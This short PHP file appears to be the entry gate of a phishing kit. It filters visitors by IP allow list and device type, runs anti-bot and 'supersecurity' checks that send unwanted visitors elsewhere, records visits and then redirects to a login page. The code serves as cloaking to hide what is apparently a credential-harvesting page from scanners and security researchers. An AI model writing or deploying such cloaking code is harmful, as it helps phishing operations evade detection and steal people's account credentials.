<?php 
session_start();
require_once 'includes/absd.php';
require_once 'includes/config.php';
require_once 'includes/functions.php';

$ip = getenv('REMOTE_ADDR');
if (!isIpAllowed($ip) == true) {
    header("Location:" . sitexite());
    exit();
}

$detect = new Mobile_Detect;
$config = getConfig();
if(!$detect->isMobile() and $config['block_pc']=="true"){
    header("Location:" . sitexite());
    exit();
} 

 if ($config['oat'] == "true") {
   oat(); 
 }

$security = new supersecurity();
$security->setTestMode(false);
$security->setExitLink(sitexite());
$security->run();
setVisitToken();
visitors();
header("Location: main/login.php");
exit();

?>